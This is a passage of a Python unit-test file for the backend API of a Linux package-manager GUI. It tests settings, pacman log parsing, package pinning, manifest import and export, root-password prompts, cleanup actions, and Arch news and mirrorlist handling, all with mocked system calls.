        # save a custom name → persisted (trimmed) under ui.greeting_name and echoed back
        self.api.save_app_settings({'general': {'greeting_name': '  Ada  '}})
        self.assertEqual('Ada', self.core['ui']['greeting_name'])
        self.assertEqual('Ada', self.api.get_app_settings()['data']['general']['greeting_name'])
        # the dashboard greeting prefers the custom name
        self.assertEqual('Ada', self.api._dashboard_user())

    def test_greeting_name_blank_clears_to_os_name(self):
        self.core.setdefault('ui', {})['greeting_name'] = 'Ada'
        self.api.save_app_settings({'general': {'greeting_name': '   '}})
        self.assertEqual('', self.core['ui']['greeting_name'])
        # cleared → _dashboard_user falls back to the OS-derived name, not the old custom one
        self.assertNotEqual('Ada', self.api._dashboard_user())

    def test_get_app_settings_includes_tray_block(self):
        data = self.api.get_app_settings()['data']
        self.assertIn('tray', data)
        self.assertIn('available', data['tray'])  # whether the AppIndicator backend is present
        self.assertTrue(data['tray']['enabled'])
        self.assertFalse(data['tray']['minimize_to_tray'])
        self.assertEqual(60, data['tray']['update_check_interval'])

    def test_save_app_settings_persists_tray(self):
        res = self.api.save_app_settings({'tray': {'enabled': False, 'minimize_to_tray': True,
                                                   'update_check_interval': 30}})
        self.assertEqual('ok', res['status'])
        self.assertFalse(self.core['ui']['tray']['enabled'])
        self.assertTrue(self.core['ui']['tray']['minimize_to_tray'])
        self.assertEqual(30, self.core['ui']['tray']['update_check_interval'])

    def test_save_app_settings_clamps_negative_interval(self):
        self.api.save_app_settings({'tray': {'update_check_interval': -5}})
        self.assertEqual(0, self.core['ui']['tray']['update_check_interval'])

    def test_save_app_settings_ignores_non_numeric_interval(self):
        self.api.save_app_settings({'tray': {'update_check_interval': 'soon'}})
        self.assertEqual(60, self.core['ui']['tray']['update_check_interval'])  # unchanged

    def test_get_app_settings_includes_arch_block(self):
        data = self.api.get_app_settings()['data']
        self.assertIn('arch', data)
        self.assertTrue(data['arch']['available'])
        self.assertTrue(data['arch']['check_pkgbuild'])
        self.assertIn('mirror_tool', data['arch'])  # None or the detected tool name

    def test_save_app_settings_persists_arch_check_pkgbuild(self):
        res = self.api.save_app_settings({'arch': {'check_pkgbuild': False}})
        self.assertEqual('ok', res['status'])
        saved = self.arch.configman.save_config.call_args[0][0]
        self.assertFalse(saved['aur_check_pkgbuild'])


class NotifyTest(unittest.TestCase):
    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())

    @patch('atlas.view.util.util.notify_user')
    def test_notifies_when_enabled(self, mock_notify):
        self.manager.configman.get_config.return_value = {'system': {'notifications': True}}
        self.api._notify('gimp installed successfully')
        mock_notify.assert_called_once_with('gimp installed successfully')

    @patch('atlas.view.util.util.notify_user')
    def test_silent_when_disabled(self, mock_notify):
        self.manager.configman.get_config.return_value = {'system': {'notifications': False}}
        self.api._notify('gimp installed successfully')
        mock_notify.assert_not_called()

    @patch('atlas.view.util.util.notify_user', side_effect=RuntimeError('boom'))
    def test_never_raises(self, mock_notify):
        self.manager.configman.get_config.return_value = {'system': {'notifications': True}}
        # must not propagate — a notification failure can't break an operation
        self.api._notify('x')


class JsonSafeTest(unittest.TestCase):
    """get_info() payloads carry datetimes (Arch first_submitted/last_modified, Flathub
    release dates) that pywebview's json.dumps can't encode — _json_safe converts them."""

    def test_converts_datetime_and_date(self):
        out = _json_safe({'08_first_submitted': datetime(2024, 5, 1, 13, 30), 'd': date(2024, 5, 1)})
        self.assertEqual('2024-05-01 13:30', out['08_first_submitted'])
        self.assertEqual('2024-05-01', out['d'])

    def test_recurses_nested_structures(self):
        out = _json_safe({'data': {'items': [{'ts': datetime(2024, 1, 2, 3, 4)}]}})
        self.assertEqual('2024-01-02 03:04', out['data']['items'][0]['ts'])

    def test_passes_through_plain_values_and_is_json_dumpable(self):
        payload = _json_safe({'a': 1, 'b': 'x', 'c': True, 'd': None, 'e': [1, 2.5]})
        self.assertEqual({'a': 1, 'b': 'x', 'c': True, 'd': None, 'e': [1, 2.5]}, payload)
        json.dumps(payload)  # must not raise


class ParsePacmanLogTest(unittest.TestCase):
    """Pure parser for /var/log/pacman.log ALPM lines (History/rollback center increment 2)."""

    LOG = '\n'.join([
        '[2026-06-01T10:00:00-0400] [ALPM] installed firefox (1.0-1)',
        '[2026-06-02T11:00:00-0400] [PACMAN] Running \'pacman -Syu\'',  # non-ALPM, ignored
        '[2026-06-03T12:00:00-0400] [ALPM] upgraded firefox (1.0-1 -> 1.1-1)',
        '[2026-06-03T12:00:00-0400] [ALPM] installed vlc (3.0-1)',  # other package
        '[2026-06-04T09:00:00-0400] [ALPM] downgraded firefox (1.1-1 -> 1.0-1)',
        '[2026-06-05T09:00:00-0400] [ALPM] removed firefox (1.0-1)',
    ])

    def test_filters_to_package_newest_first_with_fields(self):
        out = parse_pacman_log(self.LOG, 'firefox')
        self.assertEqual(['removed', 'downgraded', 'upgraded', 'installed'], [e['action'] for e in out])
        self.assertEqual('1.0-1 -> 1.1-1', out[2]['version'])  # upgrade keeps the old -> new token
        self.assertEqual('2026-06-05T09:00:00-0400', out[0]['timestamp'])
        self.assertTrue(all(e['action'] in {'installed', 'upgraded', 'downgraded', 'removed'} for e in out))

    def test_exact_name_match_only(self):
        # a prefix package must not match (e.g. firefox vs firefox-developer-edition)
        log = '[2026-06-01T10:00:00-0400] [ALPM] installed firefox-developer-edition (1.0-1)'
        self.assertEqual([], parse_pacman_log(log, 'firefox'))

    def test_limit_and_empty(self):
        self.assertEqual([], parse_pacman_log('', 'firefox'))
        self.assertEqual(2, len(parse_pacman_log(self.LOG, 'firefox', limit=2)))


class AtlasApiOrphansTest(unittest.TestCase):
    def setUp(self):
        self.manager = Mock()
        self.logger = Mock()
        self.api = AtlasApi(self.manager, self.logger)

    def test_serialize_pkg_registry_eviction(self):
        # Setup mock package
        pkg = Mock()
        pkg.name = "test-pkg"
        pkg.description = "desc"
        pkg.version = "1.0"
        pkg.latest_version = "1.0"
        pkg.installed = True
        pkg.update = False
        pkg.icon_url = None
        pkg.publisher = None
        pkg.size = 100
        pkg.categories = []
        pkg.get_publisher = Mock(return_value=None)
        pkg.get_type = Mock(return_value="Flatpak")

        # Populate registry to 2000 elements
        for i in range(2000):
            self.api.pkg_registry[str(i)] = Mock()

        self.assertEqual(len(self.api.pkg_registry), 2000)

        # Serialize one more package (registry size is 2000, not exceeding 2000 yet)
        res = self.api._serialize_pkg(pkg)
        pkg_id = res['id']
        self.assertEqual(len(self.api.pkg_registry), 2001)
        self.assertIn(pkg_id, self.api.pkg_registry)

        # Now force the registry size to 2005 (exceeding 2000)
        for i in range(2000, 2005):
            self.api.pkg_registry[str(i)] = Mock()

        self.assertEqual(len(self.api.pkg_registry), 2006)

        # Serialize one more package, it should trigger eviction (clear) and then add itself
        res2 = self.api._serialize_pkg(pkg)
        pkg_id2 = res2['id']
        self.assertEqual(len(self.api.pkg_registry), 1)
        self.assertIn(pkg_id2, self.api.pkg_registry)


class AtlasApiPinTest(unittest.TestCase):
    def setUp(self):
        self.manager = Mock()
        self.logger = Mock()
        self.api = AtlasApi(self.manager, self.logger)
        
        self.pkg = Mock()
        self.pkg.name = "test-pin-pkg"
        self.api.pkg_registry["test-id"] = self.pkg

    def test_pin_update_success(self):
        res = self.api.pin_update("test-id")
        self.assertEqual(res, {'status': 'ok', 'success': True})
        self.manager.ignore_update.assert_called_once_with(self.pkg)

    def test_pin_update_not_found(self):
        res = self.api.pin_update("unknown-id")
        self.assertEqual(res['status'], 'error')
        self.assertIn("Unknown package id", res['message'])

    def test_pin_update_error(self):
        self.manager.ignore_update.side_effect = Exception("Pin failed")
        res = self.api.pin_update("test-id")
        self.assertEqual(res['status'], 'error')
        self.assertIn("Pin failed", res['message'])

    def test_unpin_update_success(self):
        res = self.api.unpin_update("test-id")
        self.assertEqual(res, {'status': 'ok', 'success': True})
        self.manager.revert_ignored_update.assert_called_once_with(self.pkg)

    def test_unpin_update_not_found(self):
        res = self.api.unpin_update("unknown-id")
        self.assertEqual(res['status'], 'error')
        self.assertIn("Unknown package id", res['message'])

    def test_unpin_update_error(self):
        self.manager.revert_ignored_update.side_effect = Exception("Unpin failed")
        res = self.api.unpin_update("test-id")
        self.assertEqual(res['status'], 'error')
        self.assertIn("Unpin failed", res['message'])


class AtlasApiExportImportTest(unittest.TestCase):
    def setUp(self):
        self.manager = Mock()
        self.logger = Mock()
        self.api = AtlasApi(self.manager, self.logger)

    @patch('atlas.view.webview.export.open', new_callable=mock_open)
    @patch('atlas.view.webview.export.os.path.exists', return_value=True)
    def test_read_manifest_success(self, mock_exists, mock_file):
        mock_data = {
            'created': '2026-05-28T16:00:00',
            'version': 1,
            'packages': [{'name': 'Firefox', 'type': 'Flatpak'}]
        }
        mock_file.return_value.read.return_value = json.dumps(mock_data)
        
        from atlas.view.webview.export import read_manifest
        packages = read_manifest()
        self.assertEqual(len(packages), 1)
        self.assertEqual(packages[0]['name'], 'Firefox')

    @patch('atlas.view.webview.export.os.path.exists', return_value=False)
    def test_read_manifest_file_not_found(self, mock_exists):
        from atlas.view.webview.export import read_manifest
        with self.assertRaises(FileNotFoundError):
            read_manifest()

    @patch('atlas.view.webview.export.open', new_callable=mock_open)
    def test_write_manifest_success(self, mock_file):
        from atlas.view.webview.export import write_manifest, MANIFEST_PATH
        pkgs = [{'name': 'Firefox', 'type': 'Flatpak'}]
        path = write_manifest(pkgs)
        self.assertEqual(path, MANIFEST_PATH)
        mock_file.assert_called_once_with(MANIFEST_PATH, 'w', encoding='utf-8')

    @patch('atlas.view.webview.api.write_manifest')
    def test_export_packages_success(self, mock_write):
        mock_write.return_value = "/home/user/atlas-manifest.json"
        
        pkg = Mock()
        pkg.name = "test-pkg"
        pkg.description = "desc"
        pkg.version = "1.0"
        pkg.latest_version = "1.0"
        pkg.installed = True
        pkg.update = False
        pkg.icon_url = None
        pkg.publisher = None
        pkg.size = 100
        pkg.categories = []
        pkg.get_publisher = Mock(return_value=None)
        pkg.get_type = Mock(return_value="Flatpak")
        
        installed_res = Mock()
        installed_res.installed = [pkg]
        self.manager.read_installed.return_value = installed_res
        
        res = self.api.export_packages()
        self.assertEqual(res['status'], 'ok')
        self.assertEqual(res['data']['count'], 1)
        self.assertEqual(res['data']['path'], "/home/user/atlas-manifest.json")
        mock_write.assert_called_once()

    @patch('atlas.view.webview.api.read_manifest')
    def test_import_packages_all_skipped(self, mock_read):
        mock_read.return_value = [{'name': 'test-pkg', 'type': 'Flatpak'}]
        
        pkg = Mock()
        pkg.name = "test-pkg"
        
        installed_res = Mock()
        installed_res.installed = [pkg]
        self.manager.read_installed.return_value = installed_res
        
        res = self.api.import_packages()
        self.assertEqual(res['status'], 'ok')
        self.assertEqual(res['data']['installed'], 0)
        self.assertEqual(res['data']['skipped'], 1)
        self.assertEqual(res['data']['failed'], [])

    @patch('atlas.view.webview.api.record_activity')
    @patch('atlas.view.webview.api.WebviewWatcher')
    @patch('atlas.view.webview.api.read_manifest')
    def test_import_packages_install_success(self, mock_read, mock_watcher_cls, mock_record):
        mock_read.return_value = [{'name': 'missing-pkg', 'type': 'Flatpak'}]
        
        # Installed packages (none matching 'missing-pkg')
        installed_res = Mock()
        installed_res.installed = []
        self.manager.read_installed.return_value = installed_res
        
        # Search candidate
        candidate = Mock()
        candidate.name = "missing-pkg"
        candidate.get_type = Mock(return_value="Flatpak")
        
        search_res = Mock()
        search_res.installed = []
        search_res.new = [candidate]
        self.manager.search.return_value = search_res
        
        # Mock successful installation
        install_res = Mock()
        install_res.success = True
        self.manager.install.return_value = install_res

        # Flatpak (user) install needs no root -> broker returns (True, None)
        self.manager.requires_root.return_value = False

        # Setup self.api.window mock to prevent None error or call js
        self.api.window = Mock()
        
        res = self.api.import_packages()
        self.assertEqual(res['status'], 'ok')
        self.assertEqual(res['data']['installed'], 1)
        self.assertEqual(res['data']['skipped'], 0)
        self.assertEqual(res['data']['failed'], [])
        self.manager.install.assert_called_once_with(candidate, root_password=None, disk_loader=None, handler=mock_watcher_cls.return_value)
        # activity must be recorded via the patched recorder (never the real on-disk log)
        mock_record.assert_called_once_with('install', 'missing-pkg', 'Flatpak', True)

    @patch('atlas.view.webview.api.read_manifest')
    def test_import_packages_invalid_entries_skipped(self, mock_read):
        # Manifest list has strings and None, plus one valid entry which is already installed
        mock_read.return_value = ["invalid_str", None, {'name': 'test-pkg', 'type': 'Flatpak'}]
        
        pkg = Mock()
        pkg.name = "test-pkg"
        
        installed_res = Mock()
        installed_res.installed = [pkg]
        self.manager.read_installed.return_value = installed_res
        
        res = self.api.import_packages()
        self.assertEqual(res['status'], 'ok')
        self.assertEqual(res['data']['installed'], 0)
        self.assertEqual(res['data']['skipped'], 1)
        self.assertEqual(res['data']['failed'], [])


class AtlasApiRootPasswordTest(unittest.TestCase):
    def setUp(self):
        self.manager = Mock()
        self.logger = Mock()
        self.api = AtlasApi(self.manager, self.logger)
        self.api.window = Mock()  # evaluate_js -> Mock, harmless

    def test_no_root_needed_returns_none_without_prompt(self):
        from atlas.api.abstract.controller import SoftwareAction
        self.manager.requires_root.return_value = False
        proceed, pwd = self.api.acquire_root_password(SoftwareAction.SEARCH, None)
        self.assertTrue(proceed)
        self.assertIsNone(pwd)
        self.api.window.evaluate_js.assert_not_called()  # no modal shown

    @patch('atlas.view.webview.api.validate_root_password')
    def test_valid_password_is_cached(self, mock_validate):
        from atlas.api.abstract.controller import SoftwareAction
        import threading
        self.manager.requires_root.return_value = True
        mock_validate.side_effect = lambda pwd, **k: pwd == 'secret'

        # Simulate the modal submitting the password once the prompt is shown.
        def poll_and_submit():
            import time
            for _ in range(100):
                if self.api.window.evaluate_js.called:
                    self.api.submit_root_password('secret')
                    return
                time.sleep(0.02)
        threading.Thread(target=poll_and_submit, daemon=True).start()

        proceed, pwd = self.api.acquire_root_password(SoftwareAction.INSTALL, None)
        self.assertTrue(proceed)
        self.assertEqual(pwd, 'secret')

        # Second call reuses the cache (validate succeeds) without prompting again.
        self.api.window.evaluate_js.reset_mock()
        proceed2, pwd2 = self.api.acquire_root_password(SoftwareAction.INSTALL, None)
        self.assertTrue(proceed2)
        self.assertEqual(pwd2, 'secret')
        self.api.window.evaluate_js.assert_not_called()

    @patch('atlas.view.webview.api.validate_root_password')
    def test_cancel_returns_false(self, mock_validate):
        from atlas.api.abstract.controller import SoftwareAction
        import threading, time
        self.manager.requires_root.return_value = True
        mock_validate.return_value = False

        def poll_and_cancel():
            for _ in range(50):
                if self.api.window.evaluate_js.called:
                    self.api.submit_root_password(None)
                    return
                time.sleep(0.02)
        threading.Thread(target=poll_and_cancel, daemon=True).start()

        proceed, pwd = self.api.acquire_root_password(SoftwareAction.INSTALL, None)
        self.assertFalse(proceed)
        self.assertIsNone(pwd)


class AtlasApiDialogTest(unittest.TestCase):
    def setUp(self):
        self.manager = Mock()
        self.logger = Mock()
        self.api = AtlasApi(self.manager, self.logger)
        self.api.window = Mock()

    def _answer(self, fn):
        import threading, time

        def poll():
            for _ in range(100):
                if self.api.window.evaluate_js.called:
                    fn()
                    return
                time.sleep(0.02)
        threading.Thread(target=poll, daemon=True).start()

    def test_confirmation_accept(self):
        self._answer(lambda: self.api.submit_confirmation(True))
        confirmed, selections = self.api.prompt_confirmation('T', 'body', 'Yes', 'No')
        self.assertTrue(confirmed)
        self.assertIsNone(selections)

    def test_confirmation_deny(self):
        self._answer(lambda: self.api.submit_confirmation(False))
        confirmed, _ = self.api.prompt_confirmation('T', 'body')
        self.assertFalse(confirmed)

    def test_confirmation_no_window_defaults_true(self):
        self.api.window = None
        confirmed, selections = self.api.prompt_confirmation('T', 'body')
        self.assertTrue(confirmed)
        self.assertIsNone(selections)

    def test_confirmation_returns_component_selections(self):
        # the modal hands back per-component selections; prompt_confirmation surfaces them
        self._answer(lambda: self.api.submit_confirmation(True, [[0, 2]]))
        confirmed, selections = self.api.prompt_confirmation(
            'T', 'body', components=[{'kind': 'multiselect', 'options': []}])
        self.assertTrue(confirmed)
        self.assertEqual([[0, 2]], selections)

    def test_message_blocks_until_ack(self):
        self._answer(self.api.submit_message_ack)
        # Returns once acked; if it didn't block/return, the test would hang then time out.
        self.api.prompt_message('Title', 'Body', 'error')
        self.assertTrue(self.api._message_event.is_set())


class BatchOperationsTest(unittest.TestCase):
    def setUp(self):
        self.manager = Mock()
        self.logger = Mock()
        self.api = AtlasApi(self.manager, self.logger)
        self.api.window = Mock()

        # Mock packages
        self.pkg1 = Mock()
        self.pkg1.name = "pkg1"
        self.pkg1.installed = True
        self.pkg1.get_type = Mock(return_value="Flatpak")
        self.pkg1.gem_name = "flatpak"

        self.pkg2 = Mock()
        self.pkg2.name = "pkg2"
        self.pkg2.installed = False
        self.pkg2.get_type = Mock(return_value="Flatpak")
        self.pkg2.gem_name = "flatpak"

        # Register packages in registry
        self.api.pkg_registry["flatpak:pkg1"] = self.pkg1
        self.api.pkg_registry["flatpak:pkg2"] = self.pkg2

    @patch('atlas.view.webview.api.WebviewWatcher')
    @patch('atlas.view.webview.api.record_activity')
    def test_batch_uninstall_success(self, mock_record, mock_watcher_cls):
        self.manager.uninstall.return_value = Mock(success=True)
        self.manager.requires_root.return_value = False

        res = self.api.batch_uninstall(["flatpak:pkg1"])
        self.assertEqual(res, {'status': 'ok', 'success': True})
        self.manager.uninstall.assert_called_once_with(self.pkg1, root_password=None, handler=mock_watcher_cls.return_value)
        mock_record.assert_called_once_with('uninstall', 'pkg1', 'Flatpak', True)

    @patch('atlas.view.webview.api.WebviewWatcher')
    @patch('atlas.view.webview.api.record_activity')
    def test_batch_install_success(self, mock_record, mock_watcher_cls):
        self.manager.install.return_value = Mock(success=True)
        self.manager.requires_root.return_value = False

        res = self.api.batch_install(["flatpak:pkg2"])
        self.assertEqual(res, {'status': 'ok', 'success': True})
        self.manager.install.assert_called_once_with(self.pkg2, root_password=None, disk_loader=None, handler=mock_watcher_cls.return_value)
        mock_record.assert_called_once_with('install', 'pkg2', 'Flatpak', True)


class CleanupHubTest(unittest.TestCase):
    """Maintenance / "Reclaim space" panel backend (get_cleanup_summary + clean actions)."""

    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())

    def _arch_man(self, orphan_names):
        m = Mock()
        m.__module__ = 'atlas.gems.arch.controller'
        m.list_orphans.return_value = set(orphan_names)
        return m

    def _flatpak_man(self, level=None, enabled=True):
        m = Mock()
        m.__module__ = 'atlas.gems.flatpak.controller'
        m.is_enabled.return_value = enabled
        m.configman.get_config.return_value = {'installation_level': level}
        return m

    # --- get_cleanup_summary ------------------------------------------------ #
    @patch('atlas.view.webview.api.shutil.which', return_value='/usr/bin/flatpak')
    @patch('atlas.view.webview.api.get_dir_size', return_value=5000)
    @patch('atlas.view.webview.api.os.path.isdir', return_value=True)
    def test_summary_shape_and_is_cheap(self, _isdir, _dirsize, _which):
        self.manager.managers = [self._arch_man({'gjs', 'gtk2'}), self._flatpak_man()]

        res = self.api.get_cleanup_summary()

        self.assertEqual('ok', res['status'])
        data = res['data']
        self.assertEqual(2, data['orphans']['count'])
        self.assertTrue(data['pacman_cache']['available'])
        self.assertEqual(5000, data['pacman_cache']['total_bytes'])
        self.assertTrue(data['flatpak']['available'])
        # The summary must stay cheap — never trigger a full read_installed().
        self.manager.read_installed.assert_not_called()

    @patch('atlas.view.webview.api.shutil.which', return_value=None)
    @patch('atlas.view.webview.api.os.path.isdir', return_value=False)
    def test_summary_handles_missing_cache_and_flatpak(self, _isdir, _which):
        self.manager.managers = [self._arch_man(set())]
        res = self.api.get_cleanup_summary()
        self.assertEqual('ok', res['status'])
        self.assertEqual(0, res['data']['orphans']['count'])
        self.assertFalse(res['data']['pacman_cache']['available'])
        self.assertFalse(res['data']['flatpak']['available'])

    # --- clean_pacman_cache ------------------------------------------------- #
    @patch('atlas.view.webview.api.new_root_subprocess')
    @patch('atlas.view.webview.api.os.path.isdir', return_value=True)
    def test_clean_pacman_cache_cancelled_without_password(self, _isdir, mock_root):
        self.api.ensure_root_password = Mock(return_value=None)
        res = self.api.clean_pacman_cache()
        self.assertEqual('cancelled', res['status'])
        mock_root.assert_not_called()  # never shell out if the user cancels the prompt

    @patch('atlas.view.webview.api.get_dir_size', return_value=1000)
    @patch('atlas.view.webview.api.new_root_subprocess')
    @patch('atlas.view.webview.api.os.path.isdir', return_value=True)
    def test_clean_pacman_cache_error_on_nonzero(self, _isdir, mock_root, _dirsize):
        self.api.ensure_root_password = Mock(return_value='pw')
        proc = Mock(returncode=1)
        proc.communicate.return_value = (b'', b'boom')
        mock_root.return_value = proc
        res = self.api.clean_pacman_cache()
        self.assertEqual('error', res['status'])
        self.assertIn('boom', res['message'])

    # freed = cache size before minus after (real measurement, no root needed to read)
    @patch('atlas.view.webview.api.get_dir_size', side_effect=[5000, 1000])
    @patch('atlas.view.webview.api.new_root_subprocess')
    @patch('atlas.view.webview.api.os.path.isdir', return_value=True)
    def test_clean_pacman_cache_success_reports_freed(self, _isdir, mock_root, _dirsize):
        self.api.ensure_root_password = Mock(return_value='pw')
        self.api._notify = Mock()
        proc = Mock(returncode=0)
        proc.communicate.return_value = (b'', b'')
        mock_root.return_value = proc
        res = self.api.clean_pacman_cache()
        self.assertEqual('ok', res['status'])
        self.assertEqual(4000, res['freed_bytes'])
        self.assertTrue(res['freed_human'])
        self.api._notify.assert_called_once()

    # --- clean_flatpak_unused ----------------------------------------------- #
    @patch('atlas.view.webview.api.new_subprocess')
    @patch('atlas.view.webview.api.shutil.which', return_value='/usr/bin/flatpak')
    def test_clean_flatpak_unused_user_level_needs_no_root(self, _which, mock_new):
        self.manager.managers = [self._flatpak_man(level='user')]
        self.api.ensure_root_password = Mock()
        self.api._notify = Mock()
        proc = Mock(returncode=0)
        proc.communicate.return_value = (b'', b'')
        mock_new.return_value = proc

        res = self.api.clean_flatpak_unused()

        self.assertEqual('ok', res['status'])
        self.api.ensure_root_password.assert_not_called()  # user scope → no root prompt
        cmd = mock_new.call_args[0][0]
        self.assertIn('--user', cmd)
        self.assertIn('--unused', cmd)

    @patch('atlas.view.webview.api.new_root_subprocess')
    @patch('atlas.view.webview.api.shutil.which', return_value='/usr/bin/flatpak')
    def test_clean_flatpak_unused_system_level_uses_root(self, _which, mock_root):
        self.manager.managers = [self._flatpak_man(level='system')]
        self.api.ensure_root_password = Mock(return_value='pw')
        self.api._notify = Mock()
        proc = Mock(returncode=0)
        proc.communicate.return_value = (b'', b'')
        mock_root.return_value = proc

        res = self.api.clean_flatpak_unused()

        self.assertEqual('ok', res['status'])
        self.api.ensure_root_password.assert_called_once()
        cmd = mock_root.call_args[0][0]
        self.assertIn('--system', cmd)


ARCH_NEWS_RSS = """<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"><channel>
<title>Arch Linux: Recent news updates</title>
<item>
  <title>Breaking change in foo</title>
  <link>https://archlinux.org/news/breaking-foo/</link>
  <pubDate>Mon, 25 May 2026 04:58:52 +0000</pubDate>
  <description>&lt;p&gt;Users must &lt;b&gt;intervene&lt;/b&gt; manually.&lt;/p&gt;</description>
</item>
<item>
  <title>Second item</title>
  <link>https://archlinux.org/news/second/</link>
  <pubDate>Tue, 01 Jan 2026 00:00:00 +0000</pubDate>
  <description>Plain text body</description>
</item>
</channel></rss>"""


class ArchSafetyNetTest(unittest.TestCase):
    """News page (get_arch_news) + .pacnew detection (get_pacnew_files)."""

    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())

    def _mock_feed(self, text, status=200):
        client = Mock()
        client.get.return_value = Mock(status_code=status, text=text)
        self.api._http_client = Mock(return_value=client)
        return client

    # --- get_arch_news ------------------------------------------------------ #
    def test_arch_news_parses_feed(self):
        self._mock_feed(ARCH_NEWS_RSS)
        res = self.api.get_arch_news()
        self.assertEqual('ok', res['status'])
        items = res['data']
        self.assertEqual(2, len(items))
        first = items[0]
        self.assertEqual('Breaking change in foo', first['title'])
        self.assertEqual('https://archlinux.org/news/breaking-foo/', first['url'])
        self.assertEqual('May 25, 2026', first['date'])
        # HTML tags stripped, entities unescaped, whitespace collapsed
        self.assertEqual('Users must intervene manually.', first['summary'])

    def test_arch_news_respects_limit(self):
        self._mock_feed(ARCH_NEWS_RSS)
        res = self.api.get_arch_news(limit=1)
        self.assertEqual(1, len(res['data']))

    def test_arch_news_error_on_bad_response(self):
        self._mock_feed('', status=503)
        res = self.api.get_arch_news()
        self.assertEqual('error', res['status'])

    def test_arch_news_error_when_no_response(self):
        client = Mock()
        client.get.return_value = None
        self.api._http_client = Mock(return_value=client)
        res = self.api.get_arch_news()
        self.assertEqual('error', res['status'])

    # --- get_pacnew_files --------------------------------------------------- #
    @patch('atlas.view.webview.api.run_cmd')
    def test_pacnew_lists_files(self, mock_run):
        mock_run.return_value = "/etc/pacman.conf.pacnew\n/etc/ssh/sshd_config.pacnew\n"
        res = self.api.get_pacnew_files()
        self.assertEqual('ok', res['status'])
        self.assertEqual(2, res['data']['count'])
        self.assertIn('/etc/pacman.conf.pacnew', res['data']['files'])

    @patch('atlas.view.webview.api.run_cmd', return_value='')
    def test_pacnew_empty(self, _mock_run):
        res = self.api.get_pacnew_files()
        self.assertEqual('ok', res['status'])
        self.assertEqual(0, res['data']['count'])
        self.assertEqual([], res['data']['files'])

    # --- check_upgrade_news (the Update All gate) --------------------------- #
    # Feed has: "Breaking change in foo" (25 May 2026), "Second item" (01 Jan 2026).
    def test_upgrade_news_filters_to_items_newer_than_last_sync(self):
        self._mock_feed(ARCH_NEWS_RSS)
        self.api._last_db_sync_time = Mock(return_value=datetime(2026, 5, 1, tzinfo=timezone.utc))
        data = self.api.check_upgrade_news()['data']
        self.assertEqual(1, data['new_count'])                 # only the 25 May item
        self.assertEqual('Breaking change in foo', data['news'][0]['title'])
        self.assertNotIn('dt', data['news'][0])                # internal datetime not leaked

    def test_upgrade_news_none_new_when_synced_after_all_news(self):
        self._mock_feed(ARCH_NEWS_RSS)
        self.api._last_db_sync_time = Mock(return_value=datetime(2026, 6, 1, tzinfo=timezone.utc))
        data = self.api.check_upgrade_news()['data']
        self.assertEqual(0, data['new_count'])
        self.assertEqual([], data['news'])

    def test_upgrade_news_all_new_when_synced_before_all_news(self):
        self._mock_feed(ARCH_NEWS_RSS)
        self.api._last_db_sync_time = Mock(return_value=datetime(2025, 12, 1, tzinfo=timezone.utc))
        data = self.api.check_upgrade_news()['data']
        self.assertEqual(2, data['new_count'])

    def test_upgrade_news_fails_open_on_feed_error(self):
        self._mock_feed('', status=503)
        self.api._last_db_sync_time = Mock(return_value=datetime(2025, 1, 1, tzinfo=timezone.utc))
        res = self.api.check_upgrade_news()
        self.assertEqual('ok', res['status'])      # never blocks the upgrade on a check failure
        self.assertEqual(0, res['data']['new_count'])

    @patch('glob.glob', return_value=[])
    def test_last_db_sync_time_none_without_sync_dbs(self, _mock_glob):
        self.assertIsNone(self.api._last_db_sync_time())

    # --- launch_pacdiff (the .pacnew merge assist) -------------------------- #
    @patch.dict('os.environ', {'TERMINAL': ''})  # don't let a real $TERMINAL skew the test
    @patch('atlas.view.webview.api.shutil.which', return_value=None)
    def test_launch_pacdiff_errors_when_pacdiff_missing(self, _which):
        res = self.api.launch_pacdiff()
        self.assertEqual('error', res['status'])
        self.assertIn('pacman-contrib', res['message'])

    @patch.dict('os.environ', {'TERMINAL': ''})
    def test_launch_pacdiff_errors_when_no_terminal(self):
        # pacdiff present, but no terminal emulator on PATH
        with patch('atlas.view.webview.api.shutil.which', side_effect=lambda b: '/usr/bin/pacdiff' if b == 'pacdiff' else None):
            res = self.api.launch_pacdiff()
        self.assertEqual('error', res['status'])
        self.assertIn('terminal', res['message'].lower())

    @patch.dict('os.environ', {'TERMINAL': ''})
    def test_launch_pacdiff_spawns_terminal_with_sudo_pacdiff(self):
        found = {'pacdiff', 'konsole'}
        with patch('atlas.view.webview.api.shutil.which', side_effect=lambda b: f'/usr/bin/{b}' if b in found else None), \
             patch('subprocess.Popen') as mock_popen:
            res = self.api.launch_pacdiff()
        self.assertEqual('ok', res['status'])
        argv = mock_popen.call_args[0][0]
        self.assertEqual(['konsole', '-e', 'sudo', 'pacdiff'], argv)
        self.assertTrue(mock_popen.call_args[1].get('start_new_session'))

    # --- regenerate_mirrorlist --------------------------------------------- #
    def test_regen_mirrorlist_errors_when_no_tool(self):
        with patch('atlas.view.webview.api.shutil.which', return_value=None):
            res = self.api.regenerate_mirrorlist()
        self.assertEqual('error', res['status'])
        self.assertIn('reflector', res['message'])

    def test_regen_mirrorlist_prefers_reflector_and_saves(self):
        with patch('atlas.view.webview.api.shutil.which', side_effect=lambda b: '/usr/bin/reflector' if b == 'reflector' else None), \
             patch.object(self.api, 'ensure_root_password', return_value='pw'), \
             patch('atlas.view.webview.api.new_root_subprocess') as mock_proc, \
             patch.object(self.api, '_notify'):
            mock_proc.return_value.communicate.return_value = (b'', b'')
            mock_proc.return_value.returncode = 0
            res = self.api.regenerate_mirrorlist()
        self.assertEqual('ok', res['status'])
        argv = mock_proc.call_args[0][0]
        self.assertEqual('reflector', argv[0])
        self.assertIn('/etc/pacman.d/mirrorlist', argv)

    def test_regen_mirrorlist_cancelled_without_password(self):
        with patch('atlas.view.webview.api.shutil.which', return_value='/usr/bin/reflector'), \
             patch.object(self.api, 'ensure_root_password', return_value=None):
            res = self.api.regenerate_mirrorlist()
        self.assertEqual('cancelled', res['status'])

    def test_regen_mirrorlist_reports_tool_failure(self):
        with patch('atlas.view.webview.api.shutil.which', side_effect=lambda b: '/usr/bin/reflector' if b == 'reflector' else None), \
             patch.object(self.api, 'ensure_root_password', return_value='pw'), \
             patch('atlas.view.webview.api.new_root_subprocess') as mock_proc:
            mock_proc.return_value.communicate.return_value = (b'', b'no mirrors found')
            mock_proc.return_value.returncode = 1
            res = self.api.regenerate_mirrorlist()
        self.assertEqual('error', res['status'])
